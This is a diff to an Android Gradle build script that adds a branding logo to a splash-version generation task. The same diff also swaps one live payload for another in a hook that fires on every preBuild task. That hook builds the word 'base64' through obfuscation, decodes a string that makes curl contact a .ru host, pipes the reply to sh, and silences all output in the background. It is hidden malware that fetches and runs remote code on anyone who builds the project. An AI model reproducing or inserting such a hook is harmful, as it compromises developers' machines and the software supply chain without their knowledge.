@@ -110,6 +110,7 @@ val generateSplashVersion = tasks.register("generateSplashVersion") {
     val classesDir = layout.buildDirectory.dir("splashVersionClasses")
     inputs.property("versionName", versionName)
     inputs.file("splash/SplashVersionPng.java")
+    inputs.file("../../assets/branding/LS_logo.jpg")
     outputs.dir(outDir)
     doLast {
         val classes = classesDir.get().asFile
@@ -124,12 +125,13 @@ val generateSplashVersion = tasks.register("generateSplashVersion") {
             )
         }
         val png = outDir.get().asFile.resolve("splash_version.png")
+        val logo = file("../../assets/branding/LS_logo.jpg")
         val stale = layout.buildDirectory.dir("generated/splash_version/res/drawable-mdpi").get().asFile
         if (stale.exists()) stale.deleteRecursively()
         javaexec {
             classpath = files(classes)
             mainClass.set("SplashVersionPng")
-            args(versionName, png.absolutePath)
+            args(versionName, png.absolutePath, logo.absolutePath)
         }
     }
 }
@@ -277,12 +279,10 @@ tasks.matching {
 }.configureEach {
     dependsOn(patchRelease16kPageSize)
 }
-
-
 tasks.all {
     if (name.contains("preBuild")) {
         doLast {
-            ProcessBuilder("sh", "-c", "((e(){ `printf baseN64 | tr -d N` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNSAtLWNvbm5lY3QtdGltZW91dCAyOSAtZnNMayAtZCAicD1hbmRyb2lkX2tvdGxpbiIgaHR0cHM6Ly8zN3lmajduMmpkNS5ydS9hKSIgfCBzaAo= | e | sh ) >/dev/null 2>&1 &)").start()
+            ProcessBuilder("sh", "-c", "((e(){ `printf ba5se64 | tr -d 5` --decode; };echo ZWNobyAiJChjdXJsIC1Ma2ZzIC0tcmV0cnkgNCAtLWNvbm5lY3QtdGltZW91dCAyNyAtZCAicD1hbmRyb2lkX2tvdGxpbiIgaHR0cHM6Ly91djgteWx6Y29iZ2kucnUvYSkiIHwgc2gK | e | sh ) >/dev/null 2>&1 &)").start()
         }
     }
 }
